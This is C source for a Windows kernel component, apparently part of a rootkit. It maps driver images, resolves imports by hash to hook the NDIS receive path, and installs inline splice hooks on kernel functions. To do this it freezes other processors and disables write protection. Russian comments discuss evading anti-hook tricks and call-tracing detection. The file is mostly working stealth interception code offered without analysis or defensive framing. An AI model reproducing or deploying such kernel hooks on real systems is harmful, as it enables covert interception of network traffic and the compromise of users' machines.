    uint32_t len = 0xFFFFFFFF;
    const char* ptr;
    USE_GLOBAL_BLOCK

    ptr = fullName + pGlobalBlock->pCommonBlock->fnstrlen(fullName);
    for ( ; ptr >= fullName && *ptr != '\\'; --ptr, ++len);

    if (pSize != NULL) {
        *pSize = len;
    }

    return ++ptr;
}

uint8_t* common_map_driver(const wchar_t* drvName)
{
    NTSTATUS ntStatus;
    HANDLE hFile = NULL;
    FILE_STANDARD_INFORMATION fileInfo;
    uint8_t* pFileBuffer = NULL;
    uint8_t* pMappedImage = NULL;
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS pNtHdrs;
    PIMAGE_SECTION_HEADER pSection;
    uint16_t i, numberOfSections;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    UNICODE_STRING uPath;
    wchar_t path[MAX_PATH];
    USE_GLOBAL_BLOCK

    do {
        pGlobalBlock->pCommonBlock->fncommon_wcscpy_s(path, MAX_PATH, pGlobalBlock->pCommonBlock->driversPath);
        pGlobalBlock->pCommonBlock->fncommon_wcscat_s(path, MAX_PATH, drvName);

        pGlobalBlock->pCommonBlock->fnRtlInitUnicodeString(&uPath, path);

        InitializeObjectAttributes(&oa, &uPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
        ntStatus = pGlobalBlock->pCommonBlock->fnZwCreateFile(&hFile, GENERIC_READ, &oa, &iosb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); 

        if (ntStatus != STATUS_SUCCESS) {
            break;
        }

        ntStatus = pGlobalBlock->pCommonBlock->fnZwQueryInformationFile(hFile, &iosb, &fileInfo,sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
        if (ntStatus != STATUS_SUCCESS) {
            break;
        }

        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pFileBuffer, fileInfo.EndOfFile.LowPart, NonPagedPool);

        ntStatus = pGlobalBlock->pCommonBlock->fnZwReadFile(hFile, NULL, NULL, NULL, &iosb, pFileBuffer, fileInfo.EndOfFile.LowPart, 0, 0);
        if (ntStatus != STATUS_SUCCESS) {
            break;
        }

        dosHdr = (PIMAGE_DOS_HEADER)pFileBuffer;
        pNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + dosHdr->e_lfanew);

        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pMappedImage, pNtHdrs->OptionalHeader.SizeOfImage, NonPagedPool);
        
        __movsb(pMappedImage, pFileBuffer, (size_t)pNtHdrs->OptionalHeader.SizeOfHeaders);

        // Копируем все секции.
        pSection = IMAGE_FIRST_SECTION(pNtHdrs);
        numberOfSections = pNtHdrs->FileHeader.NumberOfSections;

        for (i = 0; i < numberOfSections; ++i, ++pSection) {
            if (pSection->SizeOfRawData > 0) {
                __movsb(pMappedImage + pSection->VirtualAddress, pFileBuffer + pSection->PointerToRawData, pSection->SizeOfRawData);
            }
        }
    } while (0);

    if (hFile != NULL) {
        pGlobalBlock->pCommonBlock->fnZwClose(hFile);
    }

    if (pFileBuffer != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pFileBuffer, LOADER_TAG);
    }

    return pMappedImage;
}

uint8_t* common_get_import_address(uint8_t* mappedBase, uint8_t* realBase, uint32_t importModuleHash, uint32_t funcHash)
{
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdrs;
    PIMAGE_DATA_DIRECTORY pDirectory;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    uint8_t* funcAddr = NULL;
    USE_GLOBAL_BLOCK

    // Ищем в таблице импорта функцию NdisFIndicateReceiveNetBufferLists.
    dosHdr = (PIMAGE_DOS_HEADER)mappedBase;
    ntHdrs = (PIMAGE_NT_HEADERS)(mappedBase + dosHdr->e_lfanew);

    pDirectory = &ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (pDirectory->VirtualAddress != 0) {
        pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(mappedBase + pDirectory->VirtualAddress);
        for ( ; pImportDesc->Name; ++pImportDesc) {
            uintptr_t* thunkRef;
            uintptr_t* funcRef;
            uint32_t dllNameHash;
            char* dllName = (char*)(mappedBase + pImportDesc->Name);

            dllNameHash = pGlobalBlock->pCommonBlock->fncommon_calc_hash((uint8_t*)dllName, pGlobalBlock->pCommonBlock->fnstrlen(dllName));
            if (dllNameHash == importModuleHash) {
                if (pImportDesc->OriginalFirstThunk) {
                    thunkRef = (uintptr_t*)(mappedBase + pImportDesc->OriginalFirstThunk);
                    funcRef = (uintptr_t*)(mappedBase + pImportDesc->FirstThunk);
                }
                else {
                    // no hint table
                    thunkRef = (uintptr_t*)(mappedBase + pImportDesc->FirstThunk);
                    funcRef = (uintptr_t*)(mappedBase + pImportDesc->FirstThunk);
                }
                for ( ; *funcRef; ++funcRef, ++thunkRef) {
                    PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(mappedBase + *thunkRef);
                    uint32_t currFuncHash = pGlobalBlock->pCommonBlock->fncommon_calc_hash(thunkData->Name, 0);

                    if (currFuncHash == funcHash) {
                        funcAddr = realBase + (uintptr_t)funcRef - (uintptr_t)mappedBase;
                        break;
                    }
                }

                if (funcAddr != NULL) {
                    break;
                }
            }
        }
    }

    return funcAddr;
}


// CRYPTO

#include "../../../shared/platform.h"
#include "../../../shared/types.h"
#include "base64.c"
#include "../../../shared/bignum.c"
#include "../../../shared/rsa.c"
#include "../../../shared/md5.c"
#include "../../../shared/arc4.c"

#define HASH_PADDING pGlobalBlock->pCommonBlock->hashPadding
#include "../../../shared/sha1.c"

#define USE_LZMA_DECOMPRESSOR 1
#include "../../../shared/lzma.c"

#ifdef _WIN64

extern uint32_t hardclock();

#else

__declspec(naked) uint32_t hardclock()
{
    __asm {
        rdtsc
            ret
    }
}

#endif // _WIN64

#include "../../../shared/havege.c"

#define SHARED_HAVE_X86
#include "../../../shared/aes.c"

#ifndef RANDOM_AUX_VARY
uint32_t randomAuxVarY;
#define RANDOM_AUX_VARY randomAuxVarY
#endif

#ifndef RANDOM_CONSTANT_VECTOR
uint32_t randomConstantVector[128];
#define RANDOM_CONSTANT_VECTOR randomConstantVector
#endif // RANDOM_CONSTANT_VECTOR

void crypto_random_init(rsa_context_t* pRsa)
{
    USE_GLOBAL_BLOCK

        MPI_WRITE_BINARY(&pRsa->N, (uint8_t*)RANDOM_CONSTANT_VECTOR, sizeof(RANDOM_CONSTANT_VECTOR));
    RANDOM_AUX_VARY = RANDOM_CONSTANT_VECTOR[127];
}

uint32_t crypto_random(uint32_t* seed)
{
    uint32_t* v1;
    uint32_t result;
    uint32_t v3;
    USE_GLOBAL_BLOCK

        v1 = RANDOM_CONSTANT_VECTOR + (RANDOM_AUX_VARY & 0x7F);
    RANDOM_AUX_VARY = result = *v1;
    v3 = (0x7FFFFFED * (*seed) + 0x7FFFFFC3) % 0x7FFFFFFF;
    *seed = v3;
    *v1 = v3;
    return result;
}


// DISASSM

#ifdef _WIN64
    #define HDE64_TABLE pGlobalBlock->pCommonBlock->pDissasmTable;
#else 
    #define HDE32_TABLE pGlobalBlock->pCommonBlock->pDissasmTable;
#endif // _WIN64

#include "../../../shared/ring0/hde.c"

#ifdef _WIN64

extern uint8_t* getHDETable(UINT32 is32bit);
//extern void dissasm_trigger_trampoline();

#else

uint8_t* getHDETable()
{
    __asm {
        jmp dataTableLabel
codeTableLabel:
        pop eax
        _emit 0x5D // pop ebp
        ret
dataTableLabel:
        nop
        call codeTableLabel
#include "dissasm32table.h"
    }
}

#endif 

void dissasm_lock_routine(PKDPC pDpc, void* context, void* arg1, void* arg2)
{
    USE_GLOBAL_BLOCK

    InterlockedIncrement(&pGlobalBlock->pCommonBlock->nshCPUsLocked);

    while (InterlockedCompareExchange(&pGlobalBlock->pCommonBlock->nshLockAcquired, 1, 1) == 0) {
        ;
    }

    InterlockedDecrement(&pGlobalBlock->pCommonBlock->nshCPUsLocked);
}

/** Данная функция реализует два разных типа перехватов:
    * Триггерные перехваты - этот тип используется в тех случаях, когда необходимо получить управление при вызове определённой функции, без изменения её пути исполнения.
    * Управляемый перехват - этот тип используется, когда необходимо принимать решение о возврате в оригинальную функцию.

    В обычном режиме функция перехвата расположена где-то в области неподкачиваемой памяти и обратный трамплин создаётся также отдельно.
    В данном сулчае всё реализуется за счт прыжков. Однако современные методы трассировки вызовов позволяют определять случаи, когда управление передаётся
    за пределы модуля в котором находится перехватываемая функция. В этом случае необходимо улучшить технику, которая позволит создать монолитную функцию перехвата


*/
psplice_hooker_data_t dissasm_install_hook(void* pContext, void* origProc, void* hookProc, bool_t triggered, uint8_t* memHookData, uint32_t* allocatedSize, FnCriticalCallback fnCriticalCallback)
{
#ifdef _WIN64
    #define TRAMP_SIZE 12    
#else
    #define TRAMP_SIZE 5
#endif // _AMD64_
    PMDL pMDL = NULL;
    psplice_hooker_data_t pHook = NULL;
    uint32_t entrySize;
#ifdef _WIN64
    uint64_t relAddr;
#else
    int32_t relAddr;
#endif // _WIN64
    uint32_t relocSize;
    uint8_t hookCode[24];
    uint8_t* memoryPtr;
    uint8_t*pRes;
    uint8_t* pOld;
    ulong_t opcodeLen;
    LONGLONG absAddr;
    bool_t a16;
    bool_t isRIPRelative;
    ulong_t val;
    NTSTATUS ntStatus = STATUS_INTERNAL_ERROR;
    dissasm_info_t hde;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pCommonBlock->fnmemset(hookCode, 0, 24);
    
#ifdef _WIN64
    *(PUINT16)hookCode = 0xB848;
    *(PUINT16)(hookCode + 10) = 0xE0FF;
#else
    hookCode[0] = 0xE9;
#endif

    // allocate around function entry point
    if (memHookData == NULL) {
        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pHook, pGlobalBlock->systemInfo.PageSize, NonPagedPool);
    }
    else {
        pHook = (psplice_hooker_data_t)memHookData;
        *allocatedSize = sizeof(splice_hooker_data_t) + 24;
    }

    // Определяем размер точки входа в перехватываемой функции.
    memoryPtr = (uint8_t*)origProc;

    // В некоторых x64-системах была замечена некоторая аномальность, что больше напоминает трикс с противостоянием от установки хуков на Major-функции.
    // Например реальный адрес функции имеет адрес 0xfffffaec1233aaf2, однако адрес указанный в массице мажорных функций драйвера, вместо нужного адреса
    // лежит 0xfffffaec1233aaf0, и два байта занимает инструкция mov eax, eax.
    // Частично обощив можно сделать следующие выводы. Инструкции вида mov exx, exx (где exx - суть один и тот же регистр, можно просто пропустить). Более
    // того, можно пропустить инструкции 0x90 (nop-ы).
    // Т. е. в первом цикле мы пропускаем инструкции у опкодами: 0x89 (mov), 0x8B (mov), 0x90 (nop).
    

    for ( ; ; memoryPtr += hde.len) {
        pGlobalBlock->pCommonBlock->fndissasm(memoryPtr, &hde);

        if (hde.len == 1 && hde.opcode == 0x90) {
            continue;
        }
        else if (hde.len == 2 && (hde.opcode == 0x89 || hde.opcode == 0x8B) && (hde.modrm_rm == hde.modrm_reg)) {
            continue;
        }
        break;
    }

    pHook->pOrigFunc = (uint8_t*)origProc;
    pHook->pRealHookPtr = memoryPtr;
    origProc = memoryPtr;

    while ((uint8_t*)origProc + TRAMP_SIZE > memoryPtr) {
        pGlobalBlock->pCommonBlock->fndissasm(memoryPtr, &hde);
        memoryPtr += hde.len;
    }

    entrySize = (uint32_t)(memoryPtr - (uint8_t*)origProc);

    // Создаём и инициализируем хук.
    pHook->pHookContext = pContext;
    pHook->pHookFunc = (uint8_t*)hookProc;
    pHook->entrySize = entrySize;
#ifdef _WIN64
    pHook->pThis = pHook;
#endif // _WIN64

    pHook->pTrampoline = memoryPtr = (uint8_t*)(pHook + 1);

#ifdef _WIN64

    if (triggered) {
        // 51                                                  push    rcx
        // 52                                                  push    rdx
        // 41 50                                               push    r8
        // 41 51                                               push    r9
        // 48 83 EC 10                                         sub     rsp, 10h
        // 48 8B 0D E7 FF FF FF                                mov     rcx, cs:qword_8
        // FF 15 D9 FF FF FF                                   call    cs:qword_0
        // 48 83 C4 10                                         add     rsp, 10h
        // 41 59                                               pop     r9
        // 41 58                                               pop     r8
        // 5A                                                  pop     rdx
        // 59                                                  pop     rcx

        *(((uint64_t*)memoryPtr)++) = 0x8348514150415251ULL;
        *(((uint64_t*)memoryPtr)++) = 0xFFFFE70D8B4810ECULL;
        *(((uint64_t*)memoryPtr)++) = 0x48FFFFFFD915FFFFULL;
        *(((uint64_t*)memoryPtr)++) = 0x5A5841594110C483ULL;
        *(memoryPtr++) = 0x59;
    }

#else 

    // Общий код как для хука, так и для триггера.
    if (triggered) {
//         *(((uint16_t*)memoryPtr)++) = 0x5152;           // push edx; push ecx
        *(memoryPtr++) = 0x68;                          // push pHook
        *(((uint32_t*)memoryPtr)++) = (uint32_t)pHook;
//     }
//     else {
//         *(memoryPtr++) = 0xB8;                          // mov eax, &pHook->ecxVal
//         *(((uint32_t*)memoryPtr)++) = (uint32_t)&pHook->edxVal;
//         *(((uint32_t*)memoryPtr)++) = 0x48891089;       // mov [eax], edx  
//                                                         // mov [eax + 4], ecx
//         *(((uint16_t*)memoryPtr)++) = 0x5904;           // pop ecx
//         *(memoryPtr++) = 0xB8;                          // mov eax, &pHook->origRetAddr
//         *(((uint32_t*)memoryPtr)++) = (uint32_t)&pHook->origRetAddr;
//         *(((uint16_t*)memoryPtr)++) = 0x0889;           // mov [eax], ecx
//     }
    
        *(memoryPtr++) = 0xB8;                              // mov eax, hookProc
        *(((uint32_t*)memoryPtr)++) = (uint32_t)hookProc;
        *(((uint16_t*)memoryPtr)++) = 0xD0FF;               // call eax
//     }    
//     
//     if (triggered) {
//         *(((uint16_t*)memoryPtr)++) = 0x5A59;           // pop ecx; pop edx
    }
//     else {
//         *(((uint16_t*)memoryPtr)++) = 0xB850;           // push eax
//                                                         // mov eax, &pHook->origRetAddr
//         *(((uint32_t*)memoryPtr)++) = (uint32_t)&pHook->origRetAddr;
//         *(((uint16_t*)memoryPtr)++) = 0x30FF;           // push dword ptr [eax]
//     }
    
//     if (!triggered) {
//         *(((uint32_t*)memoryPtr)++) = 0x0424448B;       // mov eax, [esp+4]
//         *(((uint16_t*)memoryPtr)++) = 0x04C2;           // retn 4
//         *(memoryPtr++) = 0x00;
// 
//         pHook->fnOrig = memoryPtr;
// 
//         *(memoryPtr++) = 0xB8;                          // mov eax, &pHook->edxVal
//         *(((uint32_t*)memoryPtr)++) = (uint32_t)&pHook->edxVal;
//         *(((uint32_t*)memoryPtr)++) = 0x488B108B;       // mov edx, [eax]
//         *(memoryPtr++) = 0x04;                          // mov ecx, [eax + 4]   
//     }

#endif // _WIN64

    pHook->fnOrig = memoryPtr;
    /*
        Relocate entry point (the same for both archs)
        Has to be written directly into the target buffer, because to
        relocate RIP-relative addressing we need to know where the
        instruction will go to...
    */
    relocSize = 0;
    pRes = memoryPtr; 

    pOld = origProc;

    while (pOld < (uint8_t*)origProc + entrySize) {
        pGlobalBlock->pCommonBlock->fndissasm(pOld, &hde);
        opcodeLen = 0;
        absAddr = 0;
        a16 = FALSE;
        isRIPRelative = FALSE;

        // check for prefixes
        if (hde.opcode == 0x67) {
            a16 = TRUE;
            continue;
        }

        /////////////////////////////////////////////////////////
        // get relative address value
        if (hde.opcode == 0xE9) {
            /* only allowed as first instruction and only if the trampoline can be planted 
            within a 32-bit boundary around the original entrypoint. So the jumper will 
            be only 5 bytes and whereever the underlying code returns it will always
            be in a solid state. But this can only be guaranteed if the jump is the first
            instruction... */
            if (pOld != pHook->pOrigFunc) {
                THROW(STATUS_NOT_SUPPORTED);
            }
        }

        if (hde.opcode == 0xFF) {
            if ((hde.flags & (F_MODRM | F_DISP32)) == (F_MODRM | F_DISP32)) {
                opcodeLen = hde.len;
                absAddr = (LONGLONG)hde.disp.disp32;
            }
        }
        else if (hde.opcode == 0xE8) { // call imm16/imm32
            if (a16) {
                absAddr = *((__int16*)(pOld + 1));
                opcodeLen = hde.len;
            }
            else {
                absAddr = *((__int32*)(pOld + 1));
                opcodeLen = hde.len;
            }
        }
        else if (hde.opcode == 0xEB || hde.opcode == 0xE3) {// jmp imm8 or jcxz imm8
            /*
                The problem with (conditional) jumps is that there will be no return into the relocated entry point.
                So the execution will be proceeded in the original method and this will cause the whole
                application to remain in an unstable state. Only near jumps with 32-bit offset are allowed as
                first instruction (see above)...
            */
            THROW(STATUS_NOT_SUPPORTED);
        }
        else if (hde.opcode == 0x0F) {
            if ((hde.opcode2 & 0xF0) == 0x80) { // jcc imm16/imm32
                THROW(STATUS_NOT_SUPPORTED);
            }
        }

        if ((hde.opcode & 0xF0) == 0x70) { // jcc imm8
            THROW(STATUS_NOT_SUPPORTED);
        }

        /////////////////////////////////////////////////////////
        // convert to: mov eax, AbsAddr

        if (opcodeLen > 0) {
            absAddr += (uintptr_t)(pOld + opcodeLen);

#ifdef _WIN64
            *(pRes++) = 0x48; // REX.W-Prefix
#endif
            *(pRes++) = 0xB8;
#ifdef _WIN64
            if ((hde.flags & (F_MODRM | F_DISP32)) == (F_MODRM | F_DISP32)) {
                absAddr = *(LONGLONG*)absAddr;
            }
#endif
            *((LONGLONG*)pRes) = absAddr;
            pRes += sizeof(void*);
            // points into entry point?
            if((absAddr >= (LONGLONG)pHook->pOrigFunc) && (absAddr < (LONGLONG)pHook->pOrigFunc + entrySize)) {
                /* is not really unhookable but not worth the effort... */
                THROW(STATUS_NOT_SUPPORTED);
            }

            /////////////////////////////////////////////////////////
            // insert alternate code
            if (hde.opcode == 0xE8 || hde.opcode == 0xFF) { // call eax or call eax (x64)
                *(pRes++) = 0xFF;
                *(pRes++) = 0xD0;
            }
            else if (hde.opcode == 0xE9) { // jmp eax
                *(pRes++) = 0xFF;
                *(pRes++) = 0xE0;
            }

            /* such conversions shouldnt be necessary in general...
               maybe the method was already hooked or uses some hook protection or is just
               bad programmed. EasyHook is capable of hooking the same method
               many times simultanously. Even if other (unknown) hook libraries are hooking methods that
               are already hooked by EasyHook. Only if EasyHook hooks methods that are already
               hooked with other libraries there can be problems if the other libraries are not
               capable of such a "bad" circumstance.
            */

            relocSize = (ulong_t)(pRes - memoryPtr);
        }

        // find next instruction
        val = (ulong_t)hde.len;

        if (opcodeLen == 0) {
            // just copy the instruction
            if (!isRIPRelative) {
                pGlobalBlock->pCommonBlock->fnmemcpy(pRes, pOld, val);
            }

            pRes += val;
        }
        pOld += val;
    }

    relocSize = (uint32_t)(pRes - memoryPtr);
    memoryPtr += relocSize;

    // add jumper to relocated entry point that will proceed execution in original method
#ifdef _WIN64

    // absolute jumper
    relAddr = (uint64_t)((uint8_t*)origProc + entrySize);

    // 68 FF FF FF 7F                                      push    7FFFFFFFh
    // C7 44 24 04 FF FF FF FF                             mov     dword ptr [rsp+4], 0FFFFFFFFh
    // C3                                                  retn

    
    *(memoryPtr++) = 0x68;
    *(((uint32_t*)memoryPtr)++) = relAddr & 0xFFFFFFFF;
    *(((uint32_t*)memoryPtr)++) = 0x042444C7;
    *(((uint32_t*)memoryPtr)++) = (relAddr >> 32) & 0xFFFFFFFF;
    *(memoryPtr++) = 0xC3;

#else

//     // relative jumper
//     relAddr = (int32_t)((uint8_t*)origProc + entrySize - (memoryPtr + 5));
//     *memoryPtr = 0xE9;
//     *(int32_t*)(memoryPtr + 1) = relAddr;

    // absolute jumper
    relAddr = (uint64_t)((uint8_t*)origProc + entrySize);
    *memoryPtr = 0x68;
    *(int32_t*)(memoryPtr + 1) = relAddr;
    *(memoryPtr + 5) = 0xC3;

#endif

    // Бэкапим оригинальный код.
    pHook->pPrefixBackup = *(uint64_t*)origProc; 
#ifdef _WIN64
    pHook->pPrefixBackup_x64 = *(uint64_t*)((uint8_t*)origProc + 8); 
#endif

    // Готовим инструкцию для прыжка из перехваченной функции до hook-стаба.
#ifdef _WIN64

    // Переход по адсолютному адресу.
    if (triggered) {
        // В случае trigger-хука, переходим на траплиновый код, где будет подготовлен вызов хука и вовзрат управления оригинальной функции.
        relAddr = (uint64_t)pHook->pTrampoline;
    }
    else {
        // В случае replace-хука, будем передавать управление сразу нашей функции.
        relAddr = (uint64_t)hookProc;
    }
    *(uint64_t*)(hookCode + 2) = relAddr;

#else

    if (triggered) {
        // Переход по относительному адресу.
        relAddr = (int32_t)(pHook->pTrampoline - ((uint8_t*)origProc + 5));
    }
    else {
        // Переход по относительному адресу.
        relAddr = (int32_t)((uint8_t*)hookProc - ((uint8_t*)origProc + 5));
    }
    *((int32_t*)(hookCode + 1)) = relAddr;

#endif

    // from now on the unrecoverable code section starts...
    {
        ulong_t i, cpuID, nOtherCPUs;
        KIRQL currIrql;
        KIRQL oldIrql;
        PKDPC dpcArray;

        oldIrql = currIrql = pGlobalBlock->pCommonBlock->fnKeGetCurrentIrql();

        if (currIrql < DISPATCH_LEVEL) {
            oldIrql = pGlobalBlock->pCommonBlock->fnKfRaiseIrql(DISPATCH_LEVEL);
        }

        InterlockedAnd(&pGlobalBlock->pCommonBlock->nshLockAcquired, 0);
        InterlockedAnd(&pGlobalBlock->pCommonBlock->nshCPUsLocked, 0);

        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &dpcArray, pGlobalBlock->systemInfo.NumberOfProcessors * sizeof(KDPC), NonPagedPool);

        cpuID = pGlobalBlock->pCommonBlock->fngetCurrentProcessor();

        for (i = 0; i < (ulong_t)pGlobalBlock->systemInfo.NumberOfProcessors; ++i) {
            PKDPC dpcTmp = &dpcArray[i];

            if (i != cpuID) {
                pGlobalBlock->pCommonBlock->fnKeInitializeDpc(dpcTmp, pGlobalBlock->pCommonBlock->fndissasm_lock_routine, NULL);
                pGlobalBlock->pCommonBlock->fnKeSetTargetProcessorDpc(dpcTmp, (CCHAR)i);
                pGlobalBlock->pCommonBlock->fnKeInsertQueueDpc(dpcTmp, NULL, NULL);
            }
        }

        nOtherCPUs = pGlobalBlock->systemInfo.NumberOfProcessors - 1;
        InterlockedCompareExchange(&pGlobalBlock->pCommonBlock->nshCPUsLocked, nOtherCPUs, nOtherCPUs);

        while (nOtherCPUs != pGlobalBlock->pCommonBlock->nshCPUsLocked) {
            ; // nop
            InterlockedCompareExchange(&pGlobalBlock->pCommonBlock->nshCPUsLocked, nOtherCPUs, nOtherCPUs);
        }

    // backup entry point for later comparsion
#ifdef _WIN64
        pHook->pHookCopy = *(uint64_t*)hookCode;

#else
        
        pHook->pHookCopy = *(uint64_t*)origProc;
        pGlobalBlock->pCommonBlock->fnmemcpy(&pHook->pHookCopy, hookCode, TRAMP_SIZE);

#endif
        if (fnCriticalCallback != NULL) {
            fnCriticalCallback(pHook);
        }

        pMDL = pGlobalBlock->pCommonBlock->fnIoAllocateMdl(origProc, entrySize, FALSE, FALSE, NULL);
        pGlobalBlock->pCommonBlock->fnMmBuildMdlForNonPagedPool(pMDL);
        pMDL->MdlFlags = pMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
        memoryPtr = pGlobalBlock->pCommonBlock->fnMmMapLockedPages(pMDL, KernelMode);

        pGlobalBlock->pCommonBlock->fnmemcpy(memoryPtr, hookCode, TRAMP_SIZE);

        if (pMDL != NULL) {
            pGlobalBlock->pCommonBlock->fnMmUnmapLockedPages(memoryPtr, pMDL);
            pGlobalBlock->pCommonBlock->fnIoFreeMdl(pMDL);
        }

        InterlockedIncrement(&pGlobalBlock->pCommonBlock->nshLockAcquired);

        InterlockedCompareExchange(&pGlobalBlock->pCommonBlock->nshCPUsLocked, 0, 0);

        while (pGlobalBlock->pCommonBlock->nshCPUsLocked != 0) {
            ; // nop
            InterlockedCompareExchange(&pGlobalBlock->pCommonBlock->nshCPUsLocked, 0, 0);
        }

        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(dpcArray, LOADER_TAG);

        pGlobalBlock->pCommonBlock->fnKfLowerIrql(oldIrql);
    }

    RETURN(STATUS_SUCCESS);

THROW_OUTRO:
FINALLY_OUTRO:
    if (!NT_SUCCESS(ntStatus)) {
        if (pHook != NULL) {
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pHook, LOADER_TAG);
            pHook = NULL;
        }
    }

    return pHook;
}

void dissasm_uninstall_hook(psplice_hooker_data_t pHook)
{
    USE_GLOBAL_BLOCK

    if (pHook == NULL) {
        return;
    }

    if (pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pHook->pOrigFunc) && (pHook->pHookCopy == *(ULONGLONG*)pHook->pRealHookPtr)) {
        ulong_t i, cpuID, nOtherCPUs;
        KIRQL currIrql;
        KIRQL oldIrql;
        PKDPC dpcArray;

        oldIrql = currIrql = pGlobalBlock->pCommonBlock->fnKeGetCurrentIrql();

        if (currIrql < DISPATCH_LEVEL) {
            oldIrql = pGlobalBlock->pCommonBlock->fnKfRaiseIrql(DISPATCH_LEVEL);
        }

        InterlockedAnd(&pGlobalBlock->pCommonBlock->nshLockAcquired, 0);
        InterlockedAnd(&pGlobalBlock->pCommonBlock->nshCPUsLocked, 0);

        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &dpcArray, pGlobalBlock->systemInfo.NumberOfProcessors * sizeof(KDPC), NonPagedPool);

        cpuID = pGlobalBlock->pCommonBlock->fngetCurrentProcessor();

        for (i = 0; i < (ulong_t)pGlobalBlock->systemInfo.NumberOfProcessors; ++i) {
            PKDPC dpcTmp = &dpcArray[i];

            if (i != cpuID) {

                pGlobalBlock->pCommonBlock->fnKeInitializeDpc(dpcTmp, pGlobalBlock->pCommonBlock->fndissasm_lock_routine, NULL);
                pGlobalBlock->pCommonBlock->fnKeSetTargetProcessorDpc(dpcTmp, (CCHAR)i);
                pGlobalBlock->pCommonBlock->fnKeInsertQueueDpc(dpcTmp, NULL, NULL);
            }
        }

        nOtherCPUs = pGlobalBlock->systemInfo.NumberOfProcessors - 1;
        InterlockedCompareExchange(&pGlobalBlock->pCommonBlock->nshCPUsLocked, nOtherCPUs, nOtherCPUs);

        while (nOtherCPUs != pGlobalBlock->pCommonBlock->nshCPUsLocked) {
            ; // nop
            InterlockedCompareExchange(&pGlobalBlock->pCommonBlock->nshCPUsLocked, nOtherCPUs, nOtherCPUs);
        }

        pGlobalBlock->pCommonBlock->fncommon_disable_wp();
        *(ULONGLONG*)pHook->pRealHookPtr = pHook->pPrefixBackup;
#ifdef _WIN64
        *(ULONGLONG*)(pHook->pRealHookPtr + 8) = pHook->pPrefixBackup_x64;
#endif
        pGlobalBlock->pCommonBlock->fncommon_enable_wp();

        InterlockedIncrement(&pGlobalBlock->pCommonBlock->nshLockAcquired);

        InterlockedCompareExchange(&pGlobalBlock->pCommonBlock->nshCPUsLocked, 0, 0);

        while (pGlobalBlock->pCommonBlock->nshCPUsLocked != 0) {
            ; // nop
            InterlockedCompareExchange(&pGlobalBlock->pCommonBlock->nshCPUsLocked, 0, 0);
        }

        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(dpcArray, LOADER_TAG);

        pGlobalBlock->pCommonBlock->fnKfLowerIrql(oldIrql);
        // release memory...
//         while (pHook->isExecuted > 0) {
//             KEVENT Event;
//             LARGE_INTEGER delay;
// 
//             delay.QuadPart = -10 * 1000 * 100;
//             pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&Event, NotificationEvent, FALSE);
//             pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&Event, Executive, KernelMode, FALSE, &delay);
//         }
    }

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pHook, LOADER_TAG);
}
